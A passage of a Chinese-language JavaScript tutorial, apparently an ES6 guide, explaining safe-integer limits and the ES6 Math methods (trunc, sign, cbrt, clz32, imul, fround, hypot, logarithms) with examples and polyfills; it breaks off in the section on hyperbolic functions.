<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.MAX_SAFE_INTEGER === <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">53</span>) - <span class="number">1</span></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.MAX_SAFE_INTEGER === <span class="number">9007199254740991</span></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.MIN_SAFE_INTEGER === -<span class="built_in">Number</span>.MAX_SAFE_INTEGER</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.MIN_SAFE_INTEGER === -<span class="number">9007199254740991</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，可以看到 JavaScript 能够精确表示的极限。</p>
<p><code>Number.isSafeInteger()</code>则是用来判断一个整数是否落在这个范围之内。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="string">&#x27;a&#x27;</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="literal">null</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="literal">NaN</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="literal">Infinity</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(-<span class="literal">Infinity</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="number">3</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="number">1.2</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="number">9007199254740990</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="number">9007199254740992</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="built_in">Number</span>.MIN_SAFE_INTEGER - <span class="number">1</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="built_in">Number</span>.MIN_SAFE_INTEGER) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="built_in">Number</span>.MAX_SAFE_INTEGER) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="built_in">Number</span>.MAX_SAFE_INTEGER + <span class="number">1</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>这个函数的实现很简单，就是跟安全整数的两个边界值比较一下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isSafeInteger = <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">typeof</span> n === <span class="string">&#x27;number&#x27;</span> &amp;&amp;</span><br><span class="line">    <span class="built_in">Math</span>.round(n) === n &amp;&amp;</span><br><span class="line">    <span class="built_in">Number</span>.MIN_SAFE_INTEGER &lt;= n &amp;&amp;</span><br><span class="line">    n &lt;= <span class="built_in">Number</span>.MAX_SAFE_INTEGER);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际使用这个函数时，需要注意。验证运算结果是否落在安全整数的范围内，不要只验证运算结果，而要同时验证参与运算的每个值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="number">9007199254740993</span>)</span><br><span class="line"><span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="number">990</span>)</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="number">9007199254740993</span> - <span class="number">990</span>)</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="number">9007199254740993</span> - <span class="number">990</span></span><br><span class="line"><span class="comment">// 返回结果 9007199254740002</span></span><br><span class="line"><span class="comment">// 正确答案应该是 9007199254740003</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>9007199254740993</code>不是一个安全整数，但是<code>Number.isSafeInteger</code>会返回结果，显示计算结果是安全的。这是因为，这个数超出了精度范围，导致在计算机内部，以<code>9007199254740992</code>的形式储存。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">9007199254740993</span> === <span class="number">9007199254740992</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>所以，如果只验证运算结果是否为安全整数，很可能得到错误结果。下面的函数可以同时验证两个运算数和运算结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trusty</span> (<span class="params">left, right, result</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    <span class="built_in">Number</span>.isSafeInteger(left) &amp;&amp;</span><br><span class="line">    <span class="built_in">Number</span>.isSafeInteger(right) &amp;&amp;</span><br><span class="line">    <span class="built_in">Number</span>.isSafeInteger(result)</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">&#x27;Operation cannot be trusted!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trusty(<span class="number">9007199254740993</span>, <span class="number">990</span>, <span class="number">9007199254740993</span> - <span class="number">990</span>)</span><br><span class="line"><span class="comment">// RangeError: Operation cannot be trusted!</span></span><br><span class="line"></span><br><span class="line">trusty(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<h4 id="7-7-Math-对象的扩展"><a href="#7-7-Math-对象的扩展" class="headerlink" title="7.7 Math 对象的扩展"></a>7.7 Math 对象的扩展</h4><p>ES6 在 Math 对象上新增了 17 个与数学相关的方法。所有这些方法都是静态方法，只能在 Math 对象上调用。</p>
<h5 id="7-7-1-Math-trunc"><a href="#7-7-1-Math-trunc" class="headerlink" title="7.7.1 Math.trunc()"></a>7.7.1 Math.trunc()</h5><p><code>Math.trunc</code>方法用于去除一个数的小数部分，返回整数部分。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.trunc(<span class="number">4.1</span>) <span class="comment">// 4</span></span><br><span class="line"><span class="built_in">Math</span>.trunc(<span class="number">4.9</span>) <span class="comment">// 4</span></span><br><span class="line"><span class="built_in">Math</span>.trunc(-<span class="number">4.1</span>) <span class="comment">// -4</span></span><br><span class="line"><span class="built_in">Math</span>.trunc(-<span class="number">4.9</span>) <span class="comment">// -4</span></span><br><span class="line"><span class="built_in">Math</span>.trunc(-<span class="number">0.1234</span>) <span class="comment">// -0</span></span><br></pre></td></tr></table></figure>
<p>对于非数值，<code>Math.trunc</code>内部使用<code>Number</code>方法将其先转为数值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.trunc(<span class="string">&#x27;123.456&#x27;</span>) <span class="comment">// 123</span></span><br><span class="line"><span class="built_in">Math</span>.trunc(<span class="literal">true</span>) <span class="comment">//1</span></span><br><span class="line"><span class="built_in">Math</span>.trunc(<span class="literal">false</span>) <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.trunc(<span class="literal">null</span>) <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<p>对于空值和无法截取整数的值，返回<code>NaN</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.trunc(<span class="literal">NaN</span>);      <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Math</span>.trunc(<span class="string">&#x27;foo&#x27;</span>);    <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Math</span>.trunc();         <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Math</span>.trunc(<span class="literal">undefined</span>) <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>对于没有部署这个方法的环境，可以用下面的代码模拟。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.trunc = <span class="built_in">Math</span>.trunc || <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x &lt; <span class="number">0</span> ? <span class="built_in">Math</span>.ceil(x) : <span class="built_in">Math</span>.floor(x);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h5 id="7-7-2-Math-sign"><a href="#7-7-2-Math-sign" class="headerlink" title="7.7.2 Math.sign()"></a>7.7.2 Math.sign()</h5><p><code>Math.sign</code>方法用来判断一个数到底是正数、负数、还是零。对于非数值，会先将其转换为数值。</p>
<p>它会返回五种值。</p>
<ul>
<li>参数为正数，返回<code>+1</code>；</li>
<li>参数为负数，返回<code>-1</code>；</li>
<li>参数为 0，返回<code>0</code>；</li>
<li>参数为-0，返回<code>-0</code>;</li>
<li>其他值，返回<code>NaN</code>。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.sign(-<span class="number">5</span>) <span class="comment">// -1</span></span><br><span class="line"><span class="built_in">Math</span>.sign(<span class="number">5</span>) <span class="comment">// +1</span></span><br><span class="line"><span class="built_in">Math</span>.sign(<span class="number">0</span>) <span class="comment">// +0</span></span><br><span class="line"><span class="built_in">Math</span>.sign(-<span class="number">0</span>) <span class="comment">// -0</span></span><br><span class="line"><span class="built_in">Math</span>.sign(<span class="literal">NaN</span>) <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>如果参数是非数值，会自动转为数值。对于那些无法转为数值的值，会返回<code>NaN</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.sign(<span class="string">&#x27;&#x27;</span>)  <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.sign(<span class="literal">true</span>)  <span class="comment">// +1</span></span><br><span class="line"><span class="built_in">Math</span>.sign(<span class="literal">false</span>)  <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.sign(<span class="literal">null</span>)  <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.sign(<span class="string">&#x27;9&#x27;</span>)  <span class="comment">// +1</span></span><br><span class="line"><span class="built_in">Math</span>.sign(<span class="string">&#x27;foo&#x27;</span>)  <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Math</span>.sign()  <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Math</span>.sign(<span class="literal">undefined</span>)  <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>对于没有部署这个方法的环境，可以用下面的代码模拟。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.sign = <span class="built_in">Math</span>.sign || <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  x = +x; <span class="comment">// convert to a number</span></span><br><span class="line">  <span class="keyword">if</span> (x === <span class="number">0</span> || <span class="built_in">isNaN</span>(x)) &#123;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> x &gt; <span class="number">0</span> ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h5 id="7-7-3-Math-cbrt"><a href="#7-7-3-Math-cbrt" class="headerlink" title="7.7.3 Math.cbrt()"></a>7.7.3 Math.cbrt()</h5><p><code>Math.cbrt()</code>方法用于计算一个数的立方根。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.cbrt(-<span class="number">1</span>) <span class="comment">// -1</span></span><br><span class="line"><span class="built_in">Math</span>.cbrt(<span class="number">0</span>)  <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.cbrt(<span class="number">1</span>)  <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">Math</span>.cbrt(<span class="number">2</span>)  <span class="comment">// 1.2599210498948732</span></span><br></pre></td></tr></table></figure>
<p>对于非数值，<code>Math.cbrt()</code>方法内部也是先使用<code>Number()</code>方法将其转为数值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.cbrt(<span class="string">&#x27;8&#x27;</span>) <span class="comment">// 2</span></span><br><span class="line"><span class="built_in">Math</span>.cbrt(<span class="string">&#x27;hello&#x27;</span>) <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>对于没有部署这个方法的环境，可以用下面的代码模拟。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.cbrt = <span class="built_in">Math</span>.cbrt || <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> y = <span class="built_in">Math</span>.pow(<span class="built_in">Math</span>.abs(x), <span class="number">1</span>/<span class="number">3</span>);</span><br><span class="line">  <span class="keyword">return</span> x &lt; <span class="number">0</span> ? -y : y;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h5 id="7-7-4-Math-clz32"><a href="#7-7-4-Math-clz32" class="headerlink" title="7.7.4 Math.clz32()"></a>7.7.4 Math.clz32()</h5><p><code>Math.clz32()</code>方法将参数转为 32 位无符号整数的形式，然后返回这个 32 位值里面有多少个前导 0。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">0</span>) <span class="comment">// 32</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">1</span>) <span class="comment">// 31</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">1000</span>) <span class="comment">// 22</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">0b01000000000000000000000000000000</span>) <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">0b00100000000000000000000000000000</span>) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，0 的二进制形式全为 0，所以有 32 个前导 0；1 的二进制形式是<code>0b1</code>，只占 1 位，所以 32 位之中有 31 个前导 0；1000 的二进制形式是<code>0b1111101000</code>，一共有 10 位，所以 32 位之中有 22 个前导 0。</p>
<p><code>clz32</code>这个函数名就来自”count leading zero bits in 32-bit binary representation of a number“（计算一个数的 32 位二进制形式的前导 0 的个数）的缩写。</p>
<p>左移运算符（<code>&lt;&lt;</code>）与<code>Math.clz32</code>方法直接相关。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">0</span>) <span class="comment">// 32</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">1</span>) <span class="comment">// 31</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">1</span> &lt;&lt; <span class="number">1</span>) <span class="comment">// 30</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">1</span> &lt;&lt; <span class="number">2</span>) <span class="comment">// 29</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">1</span> &lt;&lt; <span class="number">29</span>) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>对于小数，<code>Math.clz32</code>方法只考虑整数部分。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">3.2</span>) <span class="comment">// 30</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="number">3.9</span>) <span class="comment">// 30</span></span><br></pre></td></tr></table></figure>
<p>对于空值或其他类型的值，<code>Math.clz32</code>方法会将它们先转为数值，然后再计算。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.clz32() <span class="comment">// 32</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="literal">NaN</span>) <span class="comment">// 32</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="literal">Infinity</span>) <span class="comment">// 32</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="literal">null</span>) <span class="comment">// 32</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="string">&#x27;foo&#x27;</span>) <span class="comment">// 32</span></span><br><span class="line"><span class="built_in">Math</span>.clz32([]) <span class="comment">// 32</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(&#123;&#125;) <span class="comment">// 32</span></span><br><span class="line"><span class="built_in">Math</span>.clz32(<span class="literal">true</span>) <span class="comment">// 31</span></span><br></pre></td></tr></table></figure>
<h5 id="7-7-5-Math-imul"><a href="#7-7-5-Math-imul" class="headerlink" title="7.7.5 Math.imul()"></a>7.7.5 Math.imul()</h5><p><code>Math.imul</code>方法返回两个数以 32 位带符号整数形式相乘的结果，返回的也是一个 32 位的带符号整数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.imul(<span class="number">2</span>, <span class="number">4</span>)   <span class="comment">// 8</span></span><br><span class="line"><span class="built_in">Math</span>.imul(-<span class="number">1</span>, <span class="number">8</span>)  <span class="comment">// -8</span></span><br><span class="line"><span class="built_in">Math</span>.imul(-<span class="number">2</span>, -<span class="number">2</span>) <span class="comment">// 4</span></span><br></pre></td></tr></table></figure>
<p>如果只考虑最后 32 位，大多数情况下，<code>Math.imul(a, b)</code>与<code>a * b</code>的结果是相同的，即该方法等同于<code>(a * b)|0</code>的效果（超过 32 位的部分溢出）。之所以需要部署这个方法，是因为 JavaScript 有精度限制，超过 2 的 53 次方的值无法精确表示。这就是说，对于那些很大的数的乘法，低位数值往往都是不精确的，<code>Math.imul</code>方法可以返回正确的低位数值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="number">0x7fffffff</span> * <span class="number">0x7fffffff</span>)|<span class="number">0</span> <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<p>上面这个乘法算式，返回结果为 0。但是由于这两个二进制数的最低位都是 1，所以这个结果肯定是不正确的，因为根据二进制乘法，计算结果的二进制最低位应该也是 1。这个错误就是因为它们的乘积超过了 2 的 53 次方，JavaScript 无法保存额外的精度，就把低位的值都变成了 0。<code>Math.imul</code>方法可以返回正确的值 1。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.imul(<span class="number">0x7fffffff</span>, <span class="number">0x7fffffff</span>) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<h5 id="7-7-6-Math-fround"><a href="#7-7-6-Math-fround" class="headerlink" title="7.7.6 Math.fround()"></a>7.7.6 Math.fround()</h5><p><code>Math.fround</code>方法返回一个数的32位单精度浮点数形式。</p>
<p>对于32位单精度格式来说，数值精度是24个二进制位（1 位隐藏位与 23 位有效位），所以对于 -224 至 224 之间的整数（不含两个端点），返回结果与参数本身一致。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.fround(<span class="number">0</span>)   <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.fround(<span class="number">1</span>)   <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">Math</span>.fround(<span class="number">2</span> ** <span class="number">24</span> - <span class="number">1</span>)   <span class="comment">// 16777215</span></span><br></pre></td></tr></table></figure>
<p>如果参数的绝对值大于 224，返回的结果便开始丢失精度。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.fround(<span class="number">2</span> ** <span class="number">24</span>)       <span class="comment">// 16777216</span></span><br><span class="line"><span class="built_in">Math</span>.fround(<span class="number">2</span> ** <span class="number">24</span> + <span class="number">1</span>)   <span class="comment">// 16777216</span></span><br></pre></td></tr></table></figure>
<p><code>Math.fround</code>方法的主要作用，是将64位双精度浮点数转为32位单精度浮点数。如果小数的精度超过24个二进制位，返回值就会不同于原值，否则返回值不变（即与64位双精度值一致）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 未丢失有效精度</span></span><br><span class="line"><span class="built_in">Math</span>.fround(<span class="number">1.125</span>) <span class="comment">// 1.125</span></span><br><span class="line"><span class="built_in">Math</span>.fround(<span class="number">7.25</span>)  <span class="comment">// 7.25</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 丢失精度</span></span><br><span class="line"><span class="built_in">Math</span>.fround(<span class="number">0.3</span>)   <span class="comment">// 0.30000001192092896</span></span><br><span class="line"><span class="built_in">Math</span>.fround(<span class="number">0.7</span>)   <span class="comment">// 0.699999988079071</span></span><br><span class="line"><span class="built_in">Math</span>.fround(<span class="number">1.0000000123</span>) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>对于 <code>NaN</code> 和 <code>Infinity</code>，此方法返回原值。对于其它类型的非数值，<code>Math.fround</code> 方法会先将其转为数值，再返回单精度浮点数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.fround(<span class="literal">NaN</span>)      <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Math</span>.fround(<span class="literal">Infinity</span>) <span class="comment">// Infinity</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.fround(<span class="string">&#x27;5&#x27;</span>)      <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">Math</span>.fround(<span class="literal">true</span>)     <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">Math</span>.fround(<span class="literal">null</span>)     <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.fround([])       <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.fround(&#123;&#125;)       <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>对于没有部署这个方法的环境，可以用下面的代码模拟。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.fround = <span class="built_in">Math</span>.fround || <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Float32Array</span>([x])[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h5 id="7-7-7-Math-hypot"><a href="#7-7-7-Math-hypot" class="headerlink" title="7.7.7 Math.hypot()"></a>7.7.7 Math.hypot()</h5><p><code>Math.hypot</code>方法返回所有参数的平方和的平方根。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.hypot(<span class="number">3</span>, <span class="number">4</span>);        <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">Math</span>.hypot(<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);     <span class="comment">// 7.0710678118654755</span></span><br><span class="line"><span class="built_in">Math</span>.hypot();            <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.hypot(<span class="literal">NaN</span>);         <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Math</span>.hypot(<span class="number">3</span>, <span class="number">4</span>, <span class="string">&#x27;foo&#x27;</span>); <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Math</span>.hypot(<span class="number">3</span>, <span class="number">4</span>, <span class="string">&#x27;5&#x27;</span>);   <span class="comment">// 7.0710678118654755</span></span><br><span class="line"><span class="built_in">Math</span>.hypot(-<span class="number">3</span>);          <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，3 的平方加上 4 的平方，等于 5 的平方。</p>
<p>如果参数不是数值，<code>Math.hypot</code>方法会将其转为数值。只要有一个参数无法转为数值，就会返回 <code>NaN</code>。</p>
<h5 id="7-7-8-对数方法"><a href="#7-7-8-对数方法" class="headerlink" title="7.7.8 对数方法"></a>7.7.8 对数方法</h5><p>ES6 新增了 4 个对数相关方法。</p>
<h6 id="（1）-Math-expm1"><a href="#（1）-Math-expm1" class="headerlink" title="（1） Math.expm1()"></a>（1） Math.expm1()</h6><p><code>Math.expm1(x)</code>返回 ex - 1，即<code>Math.exp(x) - 1</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.expm1(-<span class="number">1</span>) <span class="comment">// -0.6321205588285577</span></span><br><span class="line"><span class="built_in">Math</span>.expm1(<span class="number">0</span>)  <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.expm1(<span class="number">1</span>)  <span class="comment">// 1.718281828459045</span></span><br></pre></td></tr></table></figure>
<p>对于没有部署这个方法的环境，可以用下面的代码模拟。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.expm1 = <span class="built_in">Math</span>.expm1 || <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.exp(x) - <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h6 id="（2）Math-log1p"><a href="#（2）Math-log1p" class="headerlink" title="（2）Math.log1p()"></a>（2）Math.log1p()</h6><p><code>Math.log1p(x)</code>方法返回<code>1 + x</code>的自然对数，即<code>Math.log(1 + x)</code>。如果<code>x</code>小于<code>-1</code>，返回<code>NaN</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.log1p(<span class="number">1</span>)  <span class="comment">// 0.6931471805599453</span></span><br><span class="line"><span class="built_in">Math</span>.log1p(<span class="number">0</span>)  <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.log1p(-<span class="number">1</span>) <span class="comment">// -Infinity</span></span><br><span class="line"><span class="built_in">Math</span>.log1p(-<span class="number">2</span>) <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>对于没有部署这个方法的环境，可以用下面的代码模拟。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.log1p = <span class="built_in">Math</span>.log1p || <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.log(<span class="number">1</span> + x);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h6 id="（3）Math-log10"><a href="#（3）Math-log10" class="headerlink" title="（3）Math.log10()"></a>（3）Math.log10()</h6><p><code>Math.log10(x)</code>返回以 10 为底的<code>x</code>的对数。如果<code>x</code>小于 0，则返回 <code>NaN</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.log10(<span class="number">2</span>)      <span class="comment">// 0.3010299956639812</span></span><br><span class="line"><span class="built_in">Math</span>.log10(<span class="number">1</span>)      <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.log10(<span class="number">0</span>)      <span class="comment">// -Infinity</span></span><br><span class="line"><span class="built_in">Math</span>.log10(-<span class="number">2</span>)     <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Math</span>.log10(<span class="number">100000</span>) <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
<p>对于没有部署这个方法的环境，可以用下面的代码模拟。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.log10 = <span class="built_in">Math</span>.log10 || <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.log(x) / <span class="built_in">Math</span>.LN10;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h6 id="（4）Math-log2"><a href="#（4）Math-log2" class="headerlink" title="（4）Math.log2()"></a>（4）Math.log2()</h6><p><code>Math.log2(x)</code>返回以 2 为底的<code>x</code>的对数。如果<code>x</code>小于 0，则返回 <code>NaN</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.log2(<span class="number">3</span>)       <span class="comment">// 1.584962500721156</span></span><br><span class="line"><span class="built_in">Math</span>.log2(<span class="number">2</span>)       <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">Math</span>.log2(<span class="number">1</span>)       <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.log2(<span class="number">0</span>)       <span class="comment">// -Infinity</span></span><br><span class="line"><span class="built_in">Math</span>.log2(-<span class="number">2</span>)      <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Math</span>.log2(<span class="number">1024</span>)    <span class="comment">// 10</span></span><br><span class="line"><span class="built_in">Math</span>.log2(<span class="number">1</span> &lt;&lt; <span class="number">29</span>) <span class="comment">// 29</span></span><br></pre></td></tr></table></figure>
<p>对于没有部署这个方法的环境，可以用下面的代码模拟。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.log2 = <span class="built_in">Math</span>.log2 || <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.log(x) / <span class="built_in">Math</span>.LN2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h5 id="7-7-9-双曲函数方法"><a href="#7-7-9-双曲函数方法" class="headerlink" title="7.7.9 双曲函数方法"></a>7.7.9 双曲函数方法</h5><p>ES6 新增了 6 个双曲函数方法。</p>
<ul>
<li><code>Math.sinh(x)</code> 返回<code>x</code>的双曲正弦（hyperbolic sine）</li>
<li><code>Math.cosh(x)</code> 返回<code>x</code>的双曲余弦（hyperbolic cosine）</li>
